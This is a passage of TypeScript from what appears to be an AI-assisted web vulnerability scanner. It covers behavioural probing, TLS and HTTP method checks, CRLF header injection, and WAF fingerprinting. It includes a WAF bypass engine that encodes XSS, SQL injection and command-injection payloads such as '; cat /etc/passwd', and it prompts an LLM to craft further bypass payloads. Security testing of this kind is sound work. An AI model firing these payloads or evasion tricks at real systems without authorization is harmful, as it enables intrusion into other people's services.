        for (const ep of uebaEndpoints.slice(0, 12)) {
          if (uebaCount >= 8) break;
          const baseline = behaviorBaselines.get(ep.url);
          if (!baseline) continue;

          for (const probe of lowSlowProbes) {
            try {
              const config = probe.transform(ep.url);
              const start = Date.now();
              const res = probe.method === 'POST'
                ? await axios.post(config.url, config.data || '', {
                    timeout: 8000, validateStatus: () => true,
                    headers: config.headers || {},
                  })
                : await axios.get(config.url, {
                    timeout: 8000, validateStatus: () => true,
                    headers: config.headers || {},
                  });

              const latency = Date.now() - start;
              const bodyStr = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
              const bodyLen = bodyStr.length;
              const responseHeaders = Object.keys(res.headers).sort().join(',');

              // Behavioral deviation analysis
              const deviations: string[] = [];

              // Status code change indicating access control reaction
              if (res.status !== baseline.statusCode) {
                if (res.status === 200 && baseline.statusCode >= 400) {
                  deviations.push(`Access granted: ${baseline.statusCode} → ${res.status} (potential bypass)`);
                } else if (res.status === 302 || res.status === 301) {
                  const location = res.headers['location'] || '';
                  if (/login|auth|signin|sso/i.test(location)) {
                    deviations.push(`Auth redirect detected: → ${location}`);
                  }
                }
              }

              // Response size anomaly — data exposure
              if (bodyLen > baseline.avgSize * 3 && bodyLen > 1000) {
                deviations.push(`Data volume spike: ${Math.round(baseline.avgSize)} → ${bodyLen} bytes (potential data leak)`);
              }

              // Header fingerprint change — different backend/handler
              if (responseHeaders !== baseline.headerFingerprint) {
                deviations.push(`Header fingerprint changed: different backend handling`);
              }

              // Latency anomaly — heavy processing
              if (latency > baseline.avgLatency * 5 && latency > 3000) {
                deviations.push(`Processing spike: ${Math.round(baseline.avgLatency)}ms → ${latency}ms`);
              }

              // Content type shift — different response handler
              const resContentType = String(res.headers['content-type'] || '').split(';')[0];
              if (resContentType && resContentType !== baseline.contentType) {
                deviations.push(`Content-Type shift: ${baseline.contentType} → ${resContentType}`);
              }

              // Check for sensitive data in response
              const sensitivePatterns = /password|secret|api[_-]?key|access[_-]?token|private[_-]?key|ssn|credit[_-]?card|\b\d{3}-\d{2}-\d{4}\b|bearer\s+[a-zA-Z0-9._-]{20,}/i;
              if (sensitivePatterns.test(bodyStr)) {
                deviations.push(`Sensitive data detected in response body`);
              }

              if (deviations.length >= 2 || (deviations.length === 1 && deviations[0].includes('bypass'))) {
                this.log(jobId, 'vuln', `UEBA ANOMALY [${probe.name}]: ${ep.url}`, { deviations });

                if (ai) {
                  const uebaPrompt = `As an advanced threat analyst, analyze this User and Entity Behavior Analytics (UEBA) anomaly.

Endpoint: ${ep.url}
Probe: ${probe.name}
Behavioral Deviations:
${deviations.map(d => `- ${d}`).join('\n')}

Baseline: Status ${baseline.statusCode}, Avg Size ${Math.round(baseline.avgSize)}b, Avg Latency ${Math.round(baseline.avgLatency)}ms
Probe Response: Status ${res.status}, Size ${bodyLen}b, Latency ${latency}ms
Response Snippet: ${bodyStr.substring(0, 1500)}
Server: ${baseline.serverHeader}

Determine if these behavioral deviations indicate:
1. Low-and-slow attack success (credential stuffing, session hijack, privilege escalation)
2. Insider threat indicator (unusual data access, bulk extraction)
3. Access control weakness exploitable through behavioral manipulation

Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null, "threat_type": "low_and_slow" | "insider_threat" | "access_control" | "data_exfil" }`;

                  const analysis = safeJsonParse<AiVulnResult & { threat_type?: string }>(
                    await ai.generate(uebaPrompt, true), { ...NULL_VULN, threat_type: 'unknown' }
                  );

                  if (analysis.isVulnerable && analysis.confidence > 0.7) {
                    this.log(jobId, 'vuln', `UEBA THREAT [${analysis.threat_type}]: ${analysis.gap_identified}`, {
                      endpoint: ep.url, probe: probe.name, deviations,
                      threat_type: analysis.threat_type, explanation: analysis.explanation,
                    });
                    MemoryManager.addFinding(jobId, hostname, {
                      type: 'UEBA Anomaly', subtype: analysis.threat_type,
                      endpoint: ep.url, probe: probe.name, deviations,
                      gap: analysis.gap_identified, chain_potential: analysis.chain_potential,
                      severity: 'HIGH',
                    });
                    uebaCount++;
                  }
                } else {
                  // Without AI, only flag the strongest signals
                  if (deviations.some(d => d.includes('bypass') || d.includes('Sensitive data'))) {
                    MemoryManager.addFinding(jobId, hostname, {
                      type: 'UEBA Anomaly', subtype: 'behavioral_deviation',
                      endpoint: ep.url, probe: probe.name, deviations,
                      gap: deviations.join('; '), chain_potential: null, severity: 'MEDIUM',
                    });
                    uebaCount++;
                  }
                }
              }
            } catch {}
          }
        }

        // 4e-3: Session behavior analysis — detect session mismanagement
        this.log(jobId, 'info', 'Phase 4e-3: Session behavior analysis');
        for (const ep of uebaEndpoints.slice(0, 5)) {
          if (uebaCount >= 8) break;
          try {
            // Check if session tokens rotate properly
            const res1 = await axios.get(ep.url, { timeout: 5000, validateStatus: () => true });
            const cookies1 = res1.headers['set-cookie'] || [];
            await delay(500);
            const res2 = await axios.get(ep.url, { timeout: 5000, validateStatus: () => true });
            const cookies2 = res2.headers['set-cookie'] || [];

            const sessionIssues: string[] = [];

            // Check for predictable session IDs
            for (const c of cookies1) {
              const val = c.split('=')[1]?.split(';')[0] || '';
              if (/^[0-9]+$/.test(val) && val.length < 10) {
                sessionIssues.push(`Predictable numeric session ID: ${c.split('=')[0]}=${val}`);
              }
              if (/^(session|sid|sess)$/i.test(c.split('=')[0]) && val.length < 16) {
                sessionIssues.push(`Short session token (${val.length} chars): weak entropy`);
              }
            }

            // Check for session tokens that don't change between requests (non-rotation)
            const c1Vals = cookies1.map((c: string) => c.split(';')[0]).sort();
            const c2Vals = cookies2.map((c: string) => c.split(';')[0]).sort();
            if (c1Vals.length > 0 && JSON.stringify(c1Vals) === JSON.stringify(c2Vals)) {
              // This is actually normal for session cookies — only flag if combined with other issues
            }

            if (sessionIssues.length > 0) {
              this.log(jobId, 'vuln', `SESSION BEHAVIOR ANOMALY: ${ep.url}`, { issues: sessionIssues });
              MemoryManager.addFinding(jobId, hostname, {
                type: 'UEBA Anomaly', subtype: 'session_mismanagement',
                endpoint: ep.url, gap: sessionIssues.join('; '),
                chain_potential: 'Session hijacking, fixation, or prediction', severity: 'HIGH',
              });
              uebaCount++;
            }
          } catch {}
        }

        // Collect Phase 4e findings
        const phase4eMemory = MemoryManager.getMemory(jobId, hostname);
        const phase4eFindings = phase4eMemory.findings.filter((f: Record<string, unknown>) => f.type === 'UEBA Anomaly');
        const newPhase4eFindings = phase4eFindings.slice(phase4eFindings.length - uebaCount);
        if (newPhase4eFindings.length > 0) {
          allFindings.push({ phase: 'Phase 4e', type: 'UEBA Analysis Results', data: newPhase4eFindings });
          vulnerabilities.push(...newPhase4eFindings.map((f: Record<string, unknown>) => ({
            type: f.type, endpoint: f.endpoint, gap: f.gap,
            severity: f.severity || 'HIGH', phase: 'Phase 4e'
          })));
        }
        this.log(jobId, 'info', `Phase 4e complete: ${uebaCount} UEBA anomaly(ies) detected`);

        // --- PHASE 4f: NETWORK & HOST TRAFFIC ANOMALY DETECTION ---
        this.log(jobId, 'info', 'Phase 4f: Network & Host Traffic Anomaly Detection');
        this.updateJob(jobId, 'running', 'Phase 4f: Traffic Anomaly Detection');

        // 4f-1: Protocol-level anomaly detection — deep inspection of HTTP semantics
        this.log(jobId, 'info', 'Phase 4f-1: Protocol-level anomaly detection');
        let trafficCount = 0;
        const trafficTargets = prioritizedEndpoints.slice(0, 15);

        for (const ep of trafficTargets) {
          if (trafficCount >= 10) break;
          try {
            const parsed = new URL(ep.url);
            const host = parsed.hostname;
            const useTls = parsed.protocol === 'https:';
            const port = parsed.port ? parseInt(parsed.port) : (useTls ? 443 : 80);
            const path = parsed.pathname + parsed.search;

            // Test 1: HTTP method confusion — send unusual methods
            const unusualMethods = ['TRACE', 'CONNECT', 'OPTIONS', 'PROPFIND', 'PATCH'];
            for (const method of unusualMethods) {
              try {
                const res = await axios.request({
                  url: ep.url, method: method as any,
                  timeout: 5000, validateStatus: () => true,
                });

                if (method === 'TRACE' && res.status === 200) {
                  const bodyStr = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
                  if (/TRACE|message\/http/i.test(bodyStr + (res.headers['content-type'] || ''))) {
                    this.log(jobId, 'vuln', `TRACE METHOD ENABLED on ${ep.url}`);
                    MemoryManager.addFinding(jobId, hostname, {
                      type: 'Traffic Anomaly', subtype: 'TRACE enabled',
                      endpoint: ep.url, gap: 'TRACE method enabled — Cross-Site Tracing (XST) possible',
                      chain_potential: 'Steal HttpOnly cookies via XST', severity: 'MEDIUM',
                    });
                    trafficCount++;
                  }
                }

                if (method === 'OPTIONS' && res.status === 200) {
                  // Only the RFC 7231 `Allow` header advertises server-level
                  // method support; `Access-Control-Allow-Methods` is the CORS
                  // preflight ACK that fires on every modern API that
                  // legitimately accepts PUT/DELETE for cross-origin SPAs and
                  // would mass-produce false positives.
                  const allow = String(res.headers['allow'] || '');
                  const dangerousMethods = allow
                    .split(',')
                    .map((m: string) => m.trim())
                    .filter((m: string) => /^(PUT|DELETE|PATCH)$/i.test(m));
                  if (allow && dangerousMethods.length > 0) {
                    this.log(jobId, 'vuln', `DANGEROUS METHODS ADVERTISED on ${ep.url}: ${dangerousMethods.join(', ')}`);
                    MemoryManager.addFinding(jobId, hostname, {
                      type: 'Traffic Anomaly', subtype: 'Dangerous methods advertised',
                      endpoint: ep.url, methods: dangerousMethods,
                      gap: `Server advertises mutating methods (Allow: ${dangerousMethods.join(', ')}) — verify they are not reachable unauthenticated`,
                      chain_potential: 'Potential unauthorized data modification if not properly authorized', severity: 'LOW',
                    });
                    trafficCount++;
                  }
                }

                if (method === 'PROPFIND' && (res.status === 207 || res.status === 200)) {
                  this.log(jobId, 'vuln', `WebDAV PROPFIND active on ${ep.url}`);
                  MemoryManager.addFinding(jobId, hostname, {
                    type: 'Traffic Anomaly', subtype: 'WebDAV active',
                    endpoint: ep.url, gap: 'WebDAV PROPFIND enabled — directory listing and file manipulation possible',
                    chain_potential: 'Upload webshell via PUT, list sensitive files', severity: 'HIGH',
                  });
                  trafficCount++;
                }
              } catch {}
            }

            // Test 2: TLS/SSL inspection — check for downgrade and weak ciphers
            if (useTls) {
              try {
                const tlsInfo = await new Promise<{
                  protocol: string; cipher: string; authorized: boolean;
                  certExpiry: string; certSubject: string;
                }>((resolve, reject) => {
                  const socket = tls.connect({ host, port, rejectUnauthorized: false }, () => {
                    const cipher = socket.getCipher();
                    const cert = socket.getPeerCertificate();
                    resolve({
                      protocol: socket.getProtocol() || 'unknown',
                      cipher: cipher ? `${cipher.name} (${cipher.version})` : 'unknown',
                      authorized: socket.authorized,
                      certExpiry: cert.valid_to || '',
                      certSubject: cert.subject ? JSON.stringify(cert.subject) : '',
                    });
                    socket.end();
                  });
                  socket.setTimeout(5000);
                  socket.on('error', reject);
                  socket.on('timeout', () => { socket.destroy(); reject(new Error('timeout')); });
                });

                const tlsIssues: string[] = [];

                // Weak protocol versions
                if (/TLSv1$|TLSv1\.0|SSLv3/i.test(tlsInfo.protocol)) {
                  tlsIssues.push(`Weak TLS version: ${tlsInfo.protocol}`);
                }

                // Weak ciphers
                if (/RC4|DES|MD5|NULL|EXPORT|anon/i.test(tlsInfo.cipher)) {
                  tlsIssues.push(`Weak cipher: ${tlsInfo.cipher}`);
                }

                // Certificate expiry check
                if (tlsInfo.certExpiry) {
                  const expiry = new Date(tlsInfo.certExpiry);
                  const now = new Date();
                  const daysToExpiry = (expiry.getTime() - now.getTime()) / (1000 * 60 * 60 * 24);
                  if (daysToExpiry < 0) {
                    tlsIssues.push(`Certificate expired: ${tlsInfo.certExpiry}`);
                  } else if (daysToExpiry < 30) {
                    tlsIssues.push(`Certificate expiring soon (${Math.round(daysToExpiry)} days): ${tlsInfo.certExpiry}`);
                  }
                }

                // Self-signed or unauthorized
                if (!tlsInfo.authorized) {
                  tlsIssues.push('Certificate not trusted (self-signed or invalid chain)');
                }

                if (tlsIssues.length > 0) {
                  this.log(jobId, 'vuln', `TLS ANOMALY on ${host}:${port}`, {
                    issues: tlsIssues, protocol: tlsInfo.protocol, cipher: tlsInfo.cipher,
                  });
                  MemoryManager.addFinding(jobId, hostname, {
                    type: 'Traffic Anomaly', subtype: 'TLS weakness',
                    endpoint: ep.url, gap: tlsIssues.join('; '),
                    chain_potential: 'MITM attack, traffic interception, downgrade attacks',
                    severity: tlsIssues.some(i => i.includes('expired') || i.includes('Weak TLS')) ? 'HIGH' : 'MEDIUM',
                    details: { protocol: tlsInfo.protocol, cipher: tlsInfo.cipher },
                  });
                  trafficCount++;
                }
              } catch {}
            }

            // Test 3: HTTP/2 and protocol-level fingerprinting
            try {
              const res = await axios.get(ep.url, { timeout: 5000, validateStatus: () => true });
              const serverHeader = res.headers['server'] || '';
              const poweredBy = res.headers['x-powered-by'] || '';
              const via = res.headers['via'] || '';
              const xForwarded = res.headers['x-forwarded-for'] || res.headers['x-real-ip'] || '';

              const fingerprints: string[] = [];
              if (serverHeader) fingerprints.push(`Server: ${serverHeader}`);
              if (poweredBy) fingerprints.push(`X-Powered-By: ${poweredBy}`);
              if (via) fingerprints.push(`Via: ${via} (proxy/CDN detected)`);
              if (xForwarded) fingerprints.push(`X-Forwarded-For leaked: ${xForwarded}`);

              // Check for information disclosure via headers
              if (poweredBy || (serverHeader && /\d+\.\d+/.test(String(serverHeader)))) {
                this.log(jobId, 'info', `Server fingerprint: ${fingerprints.join(', ')}`, { endpoint: ep.url });
              }
            } catch {}
          } catch {}
        }
        this.log(jobId, 'info', `Phase 4f-1 complete: ${trafficCount} protocol anomaly(ies) detected`);

        // 4f-2: Connection behavior analysis — detect infrastructure-level patterns
        this.log(jobId, 'info', 'Phase 4f-2: Connection behavior analysis');
        const connTargets = discoveredAssets.slice(0, 8);
        for (const asset of connTargets) {
          if (trafficCount >= 10) break;
          try {
            const parsed = new URL(asset);
            const host = parsed.hostname;
            const useTls = parsed.protocol === 'https:';
            const port = parsed.port ? parseInt(parsed.port) : (useTls ? 443 : 80);

            // Test connection reuse behavior — detect keep-alive misconfigurations
            const rawProbe = `GET / HTTP/1.1\r\nHost: ${host}\r\nConnection: keep-alive\r\n\r\nGET /nonexistent-probe-path HTTP/1.1\r\nHost: ${host}\r\nConnection: close\r\n\r\n`;

            const pipelineResponse = await rawHttpRequest(host, port, useTls, rawProbe, 5000);

            // Check if server processed both requests (HTTP pipelining)
            const httpResponses = pipelineResponse.split(/(?=HTTP\/\d)/);
            if (httpResponses.length > 2) {
              this.log(jobId, 'vuln', `HTTP PIPELINING ACCEPTED on ${asset}`);
              MemoryManager.addFinding(jobId, hostname, {
                type: 'Traffic Anomaly', subtype: 'HTTP pipelining',
                endpoint: asset, gap: 'Server processes pipelined requests — potential for request smuggling and response queue poisoning',
                chain_potential: 'Response queue poisoning, cache deception', severity: 'MEDIUM',
              });
              trafficCount++;
            }

            // Test for HTTP response splitting via header injection
            try {
              const splitUrl = `${asset}${asset.includes('?') ? '&' : '?'}redirect=%0d%0aX-Injected:%20true`;
              const splitRes = await axios.get(splitUrl, { timeout: 5000, validateStatus: () => true, maxRedirects: 0 });
              if (splitRes.headers['x-injected'] === 'true') {
                this.log(jobId, 'vuln', `HTTP RESPONSE SPLITTING on ${asset}`);
                MemoryManager.addFinding(jobId, hostname, {
                  type: 'Traffic Anomaly', subtype: 'Response splitting',
                  endpoint: asset, gap: 'HTTP response splitting via header injection — CRLF in redirect parameter creates injected headers',
                  chain_potential: 'Cache poisoning, XSS via injected headers, session fixation', severity: 'CRITICAL',
                });
                trafficCount++;
              }
            } catch {}
          } catch {}
        }

        // 4f-3: AI-driven traffic pattern synthesis
        if (ai && trafficCount > 0) {
          this.log(jobId, 'info', 'Phase 4f-3: AI traffic pattern analysis');
          const trafficMemory = MemoryManager.getMemory(jobId, hostname);
          const trafficFindings = trafficMemory.findings.filter((f: Record<string, unknown>) => f.type === 'Traffic Anomaly');
          const recentTraffic = trafficFindings.slice(-10);

          if (recentTraffic.length >= 2) {
            const trafficPrompt = `Analyze the following network and host traffic anomalies discovered during the security assessment of ${targetUrl}.

Anomalies Found:
${JSON.stringify(recentTraffic, null, 2)}

Infrastructure Context:
- Server: ${behaviorBaselines.values().next().value?.serverHeader || 'unknown'}
- Assets scanned: ${discoveredAssets.length}
- Endpoints analyzed: ${endpoints.length}

Your task:
1. Identify patterns that suggest systemic infrastructure weaknesses
2. Determine if any traffic anomalies can be combined for higher-impact attacks
3. Assess whether the infrastructure is vulnerable to advanced persistent threat (APT) techniques
4. Rate the overall network security posture

Return JSON: {
  "infrastructure_risk": "CRITICAL" | "HIGH" | "MEDIUM" | "LOW",
  "systemic_issues": string[],
  "attack_surfaces": [{ "name": string, "findings_used": string[], "impact": string, "feasibility": number }],
  "apt_indicators": string[]
}`;

            const trafficAnalysis = safeJsonParse<{
              infrastructure_risk: string; systemic_issues: string[];
              attack_surfaces: { name: string; findings_used: string[]; impact: string; feasibility: number }[];
              apt_indicators: string[];
            }>(await ai.generate(trafficPrompt, true), {
              infrastructure_risk: 'UNKNOWN', systemic_issues: [], attack_surfaces: [], apt_indicators: []
            });

            for (const surface of trafficAnalysis.attack_surfaces.filter(s => s.feasibility > 0.6)) {
              MemoryManager.addFinding(jobId, hostname, {
                type: 'Traffic Anomaly', subtype: 'Infrastructure attack surface',
                endpoint: targetUrl,
                gap: surface.impact, chain_potential: surface.name,
                findings_used: surface.findings_used, severity: trafficAnalysis.infrastructure_risk,
              });
              trafficCount++;
            }

            if (trafficAnalysis.apt_indicators.length > 0) {
              this.log(jobId, 'info', `APT indicators identified: ${trafficAnalysis.apt_indicators.join(', ')}`);
            }

            this.log(jobId, 'info', `Infrastructure risk assessment: ${trafficAnalysis.infrastructure_risk}`);
          }
        }

        // Collect Phase 4f findings
        const phase4fMemory = MemoryManager.getMemory(jobId, hostname);
        const phase4fFindings = phase4fMemory.findings.filter((f: Record<string, unknown>) => f.type === 'Traffic Anomaly');
        const newPhase4fFindings = phase4fFindings.slice(phase4fFindings.length > trafficCount ? phase4fFindings.length - trafficCount : 0);
        if (newPhase4fFindings.length > 0) {
          allFindings.push({ phase: 'Phase 4f', type: 'Traffic Anomaly Detection Results', data: newPhase4fFindings });
          vulnerabilities.push(...newPhase4fFindings.map((f: Record<string, unknown>) => ({
            type: f.type, endpoint: f.endpoint || f.asset, gap: f.gap,
            severity: f.severity || 'MEDIUM', phase: 'Phase 4f'
          })));
        }
        this.log(jobId, 'info', `Phase 4f complete: ${trafficCount} traffic anomaly(ies) added to report`);

        // --- PHASE 4g: WAF DETECTION & BYPASS ENGINE ---
        this.log(jobId, 'info', 'Phase 4g: WAF Detection & Bypass Engine');
        this.updateJob(jobId, 'running', 'Phase 4g: WAF Detection');

        // 4g-1: WAF fingerprinting — identify vendor/product by response patterns
        this.log(jobId, 'info', 'Phase 4g-1: WAF fingerprinting');
        const wafSignatures: { name: string; headers: Record<string, RegExp>; bodyPatterns: RegExp[]; statusCodes: number[] }[] = [
          { name: 'Cloudflare', headers: { 'server': /cloudflare/i, 'cf-ray': /.+/ }, bodyPatterns: [/cloudflare/i, /ray ID/i, /cf-chl-bypass/i], statusCodes: [403, 503] },
          { name: 'AWS WAF', headers: { 'x-amzn-requestid': /.+/ }, bodyPatterns: [/aws|amazon/i, /request blocked/i], statusCodes: [403] },
          { name: 'Akamai', headers: { 'x-akamai-transformed': /.+/, 'server': /AkamaiGHost/i }, bodyPatterns: [/akamai/i, /reference.*#/i], statusCodes: [403] },
          { name: 'Imperva/Incapsula', headers: { 'x-cdn': /Imperva|Incapsula/i }, bodyPatterns: [/incapsula|imperva|_Incapsula_Resource/i], statusCodes: [403] },
          { name: 'F5 BIG-IP ASM', headers: { 'server': /BIG-IP|BigIP/i }, bodyPatterns: [/request rejected|the requested URL was rejected/i], statusCodes: [403] },
          { name: 'ModSecurity', headers: {}, bodyPatterns: [/mod_security|modsecurity|NOYB/i], statusCodes: [403, 406] },
          { name: 'Sucuri', headers: { 'server': /Sucuri/i, 'x-sucuri-id': /.+/ }, bodyPatterns: [/sucuri|cloudproxy/i], statusCodes: [403] },
          { name: 'Barracuda', headers: { 'server': /Barracuda/i }, bodyPatterns: [/barracuda/i], statusCodes: [403] },
          { name: 'Fortinet/FortiWeb', headers: { 'server': /FortiWeb/i }, bodyPatterns: [/fortigate|fortiweb/i], statusCodes: [403] },
          { name: 'DenyAll', headers: {}, bodyPatterns: [/conditionblocked|denyall/i], statusCodes: [403] },
          { name: 'Wordfence', headers: {}, bodyPatterns: [/wordfence|wfBlock/i, /generated by Wordfence/i], statusCodes: [403, 503] },
        ];

        const wafTriggerPayloads = [
          { name: 'XSS probe', value: '<script>alert(1)</script>' },
          { name: 'SQLi probe', value: "' OR 1=1--" },
          { name: 'Path traversal', value: '../../etc/passwd' },
          { name: 'Command injection', value: '; cat /etc/passwd' },
          { name: 'LDAP injection', value: '*)(&' },
        ];

        let wafCount = 0;
        const detectedWafs: { name: string; confidence: number; endpoint: string; evidence: string[] }[] = [];

        // Test top assets with trigger payloads to provoke WAF responses
        for (const asset of discoveredAssets.slice(0, 5)) {
          const wafEvidence: Record<string, string[]> = {};

          for (const payload of wafTriggerPayloads) {
            try {
              const sep = asset.includes('?') ? '&' : '?';
              const testUrl = `${asset}${sep}waftest=${encodeURIComponent(payload.value)}`;
              const res = await axios.get(testUrl, {
                timeout: 8000, validateStatus: () => true, maxRedirects: 0,
              });

              const bodyStr = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);

              for (const sig of wafSignatures) {
                const matches: string[] = [];

                // Check headers
                for (const [header, pattern] of Object.entries(sig.headers)) {
                  const headerVal = String(res.headers[header] || '');
                  if (headerVal && pattern.test(headerVal)) {
                    matches.push(`Header ${header}: ${headerVal}`);
                  }
                }

                // Check body patterns
                for (const pattern of sig.bodyPatterns) {
                  if (pattern.test(bodyStr)) {
                    matches.push(`Body match: ${pattern.source}`);
                  }
                }

                // Check status codes
                if (sig.statusCodes.includes(res.status) && matches.length > 0) {
                  matches.push(`Status: ${res.status}`);
                }

                if (matches.length >= 2) {
                  if (!wafEvidence[sig.name]) wafEvidence[sig.name] = [];
                  wafEvidence[sig.name].push(...matches);
                }
              }
            } catch {}
          }

          // Record detected WAFs
          for (const [wafName, evidence] of Object.entries(wafEvidence)) {
            const uniqueEvidence = [...new Set(evidence)];
            const confidence = Math.min(uniqueEvidence.length / 4, 1.0);
            detectedWafs.push({ name: wafName, confidence, endpoint: asset, evidence: uniqueEvidence });

            this.log(jobId, 'info', `WAF DETECTED: ${wafName} on ${asset}`, { evidence: uniqueEvidence, confidence });
            MemoryManager.addFinding(jobId, hostname, {
              type: 'WAF Detection', subtype: wafName,
              endpoint: asset, gap: `${wafName} WAF detected with ${Math.round(confidence * 100)}% confidence`,
              chain_potential: 'Bypass techniques may enable exploitation of blocked vulnerabilities',
              evidence: uniqueEvidence, severity: 'INFO',
            });
            wafCount++;
          }
        }
        this.log(jobId, 'info', `Phase 4g-1 complete: ${detectedWafs.length} WAF(s) identified`);

        // 4g-2: WAF bypass techniques — test evasion methods against detected WAFs
        this.log(jobId, 'info', 'Phase 4g-2: WAF bypass testing');
        let bypassCount = 0;
        const bypassTechniques: { name: string; transform: (payload: string) => string }[] = [
          { name: 'Case mutation', transform: (p) => p.split('').map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join('') },
          { name: 'Double URL encoding', transform: (p) => encodeURIComponent(p) },
          { name: 'Unicode escape', transform: (p) => p.split('').map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`).join('') },
          { name: 'HTML entity encoding', transform: (p) => p.split('').map(c => `&#${c.charCodeAt(0)};`).join('') },
          { name: 'Hex encoding', transform: (p) => p.split('').map(c => `%${c.charCodeAt(0).toString(16)}`).join('') },
          { name: 'Null byte insertion', transform: (p) => p.split('').join('\0') },
          { name: 'Comment insertion (SQL)', transform: (p) => p.replace(/\s+/g, '/**/') },
          { name: 'Tab/newline substitution', transform: (p) => p.replace(/\s+/g, '\t') },
          { name: 'Chunked payload', transform: (p) => { const mid = Math.floor(p.length / 2); return p.slice(0, mid) + '\n' + p.slice(mid); } },
          { name: 'Overlong UTF-8', transform: (p) => p.replace(/</g, '\xC0\xBC').replace(/>/g, '\xC0\xBE') },
        ];

        const basePayloads = [
          { name: 'XSS', value: '<script>alert(1)</script>', blocked_status: [403, 406, 501] },
          { name: 'SQLi', value: "' OR 1=1--", blocked_status: [403, 406, 501] },
          { name: 'RCE', value: '; id', blocked_status: [403, 406, 501] },
        ];

        for (const asset of discoveredAssets.slice(0, 3)) {
          if (bypassCount >= 5) break;

          // Fetch a clean baseline response (no malicious payload) for comparison
          let cleanStatus = 0;
          let cleanBodyLen = 0;
          try {
            const sep = asset.includes('?') ? '&' : '?';
            const cleanRes = await axios.get(`${asset}${sep}q=harmless_test_value`, { timeout: 5000, validateStatus: () => true, maxRedirects: 0 });
            cleanStatus = cleanRes.status;
            const cleanBody = typeof cleanRes.data === 'string' ? cleanRes.data : JSON.stringify(cleanRes.data);
            cleanBodyLen = cleanBody.length;
          } catch { continue; }

          // If the asset returns a 3xx redirect on a harmless query, the WAF
          // never inspects the request body — the edge redirects (e.g.
          // tiktok.com → www.tiktok.com or http→https) before the payload
          // reaches the WAF rule chain. Any "bypass" reported here is a
          // false positive: clean baseline 301 == payload response 301
          // because BOTH got redirected pre-WAF. Skip this asset and let
          // the redirect target be tested separately.
          if (cleanStatus >= 300 && cleanStatus < 400) {
            this.log(jobId, 'info', `Skipping WAF bypass tests on ${asset}: clean baseline returned ${cleanStatus}, redirect happens before WAF inspection`);
            continue;
          }

          // First establish what gets blocked
          for (const bp of basePayloads) {
            try {
              const sep = asset.includes('?') ? '&' : '?';
              const blockedUrl = `${asset}${sep}q=${encodeURIComponent(bp.value)}`;
              const blockedRes = await axios.get(blockedUrl, { timeout: 5000, validateStatus: () => true, maxRedirects: 0 });

              const isBlocked = bp.blocked_status.includes(blockedRes.status);
              if (!isBlocked) continue; // WAF didn't block the raw payload, skip bypass testing

              // Try each bypass technique
              for (const technique of bypassTechniques) {
                if (bypassCount >= 5) break;
                try {
                  const bypassPayload = technique.transform(bp.value);
                  const bypassUrl = `${asset}${sep}q=${encodeURIComponent(bypassPayload)}`;
                  const bypassRes = await axios.get(bypassUrl, { timeout: 5000, validateStatus: () => true, maxRedirects: 0 });

                  // Bypass detected: not blocked AND response resembles the clean baseline
                  // (not just a different error page)
                  const bypassBody = typeof bypassRes.data === 'string' ? bypassRes.data : JSON.stringify(bypassRes.data);
                  const statusMatchesClean = bypassRes.status === cleanStatus;
                  const sizeMatchesClean = cleanBodyLen === 0 ? bypassBody.length === 0 : Math.abs(bypassBody.length - cleanBodyLen) < cleanBodyLen * 0.5;
                  const notBlocked = !bp.blocked_status.includes(bypassRes.status) && bypassRes.status !== 400;

                  if (notBlocked && (statusMatchesClean || sizeMatchesClean)) {
                    this.log(jobId, 'vuln', `WAF BYPASS [${technique.name}]: ${bp.name} on ${asset}`, {
                      original_status: blockedRes.status, bypass_status: bypassRes.status,
                      clean_status: cleanStatus, technique: technique.name, payload_type: bp.name,
                    });

                    if (ai) {
                      const bypassPrompt = `Analyze this WAF bypass finding.

Target: ${asset}
Original payload (${bp.name}): ${bp.value} → Blocked (Status ${blockedRes.status})
Bypass technique: ${technique.name}
Encoded payload: ${bypassPayload.substring(0, 200)}
Bypass result: Status ${bypassRes.status}, Body size ${bypassBody.length}
Clean baseline: Status ${cleanStatus}, Body size ${cleanBodyLen}
Response snippet: ${bypassBody.substring(0, 500)}
Detected WAF(s): ${detectedWafs.map(w => w.name).join(', ') || 'unknown'}

A genuine WAF bypass means the encoded payload reaches the backend and produces a response similar to normal requests (not just a different error page).
Is this a genuine WAF bypass or a false positive?
Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null }`;

                      const analysis = safeJsonParse<AiVulnResult>(await ai.generate(bypassPrompt, true), NULL_VULN);
                      if (analysis.isVulnerable && analysis.confidence > 0.7) {
                        MemoryManager.addFinding(jobId, hostname, {
                          type: 'WAF Bypass', subtype: technique.name,
                          endpoint: asset, payload_type: bp.name,
                          gap: analysis.gap_identified, chain_potential: analysis.chain_potential,
                          severity: 'HIGH',
                        });
                        bypassCount++;
                      }
                    } else {
                      // No-AI: require response matches clean baseline closely
                      if (statusMatchesClean && sizeMatchesClean) {
                        MemoryManager.addFinding(jobId, hostname, {
                          type: 'WAF Bypass', subtype: technique.name,
                          endpoint: asset, payload_type: bp.name,
                          gap: `WAF bypass via ${technique.name}: ${bp.name} payload passes with Status ${bypassRes.status} (matches clean baseline ${cleanStatus})`,
                          chain_potential: 'Enables exploitation of vulnerabilities that WAF normally blocks',
                          severity: 'HIGH',
                        });
                        bypassCount++;
                      }
                    }
                  }
                } catch {}
              }
            } catch {}
          }
        }
        this.log(jobId, 'info', `Phase 4g-2 complete: ${bypassCount} WAF bypass(es) found`);

        // 4g-3: Adaptive payload mutation — AI-driven payload crafting based on WAF profile
        if (ai && detectedWafs.length > 0) {
          this.log(jobId, 'info', 'Phase 4g-3: AI adaptive payload mutation');
          const wafProfile = detectedWafs.map(w => `${w.name} (${Math.round(w.confidence * 100)}% confidence)`).join(', ');

          const mutationPrompt = `You are an expert WAF bypass researcher. Based on the detected WAF profile, generate custom bypass payloads.

Target: ${targetUrl}
Detected WAFs: ${wafProfile}
Tech Stack: ${JSON.stringify(discoveredInfo.identifiers || {})}
Bypass Results So Far: ${bypassCount} bypasses found using encoding techniques

Generate 5 advanced, WAF-specific bypass payloads tailored to the detected WAF(s).
Consider: protocol-level evasion, HTTP parameter pollution, request body encoding tricks, content-type confusion, HTTP/2 specific bypasses.

